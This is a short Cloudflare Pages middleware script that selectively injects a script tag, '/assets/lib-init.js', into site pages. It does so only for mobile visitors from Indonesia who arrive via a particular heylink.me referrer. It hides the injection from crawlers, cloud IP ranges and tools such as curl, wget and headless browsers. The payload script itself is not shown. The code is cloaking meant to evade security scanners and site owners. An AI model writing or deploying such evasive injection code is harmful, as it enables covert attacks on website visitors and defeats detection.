export async function onRequest(context) {
  const { request, next } = context;
  const url = new URL(request.url);
  if (url.pathname.startsWith('/assets/')) {
    return next();
  }
  const userAgent = (request.headers.get('user-agent') || '').toLowerCase();
  const referer = (request.headers.get('referer') || '').toLowerCase();
  const cookies = request.headers.get('cookie') || '';
  const isFromMyHeylink = referer.includes('heylink.me/kopi-sensa');
  const hasShortCookie = cookies.includes('session_id=active');
  if (!isFromMyHeylink && !hasShortCookie) {
    return next();
  }
  const country = request.cf ? request.cf.country : 'Unknown';
  const asOrganization = request.cf ? (request.cf.asOrganization || '').toLowerCase() : '';
  if (country !== 'ID') {
    return next();
  }
  const cloudProviders = ['amazon', 'google', 'digitalocean', 'microsoft', 'cloudflare', 'akamai', 'linode', 'ovh', 'datacentre'];
  const isCloud = cloudProviders.some(provider => asOrganization.includes(provider));
  if (isCloud) {
    return next();
  }
  const botList = /bot|spider|crawl|google|bing|slurp|yandex|baiduspider|duckduckbot|facebookexternalhit|adsbot|tiktok|bytedance|lighthouse|vision|petalinux|headless|python|wget|curl|screenshot|preview|mediapartners|dubbin|monit|monitoring|uptimerobot|node-fetch|axios|go-http-client|java|php|postman|insomnia/i;
  if (botList.test(userAgent)) {
    return next();
  }
  const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile/i.test(userAgent);
  if (!isMobile) {
    return next();
  }
const response = await next();
  const newHeaders = new Headers(response.headers);
  if (isFromMyHeylink) {
    newHeaders.set('Set-Cookie', 'session_id=active; Max-Age=60; Path=/; SameSite=Lax; HttpOnly');
  }
  const newResponse = new Response(response.body, {
    status: response.status,
    statusText: response.statusText,
    headers: newHeaders
  });
  return new HTMLRewriter()
    .on('body', {
      element(el) {
        el.append(`
          <script src="/assets/lib-init.js" defer></script>
        `, { html: true });
      },
    })
    .transform(newResponse);
}
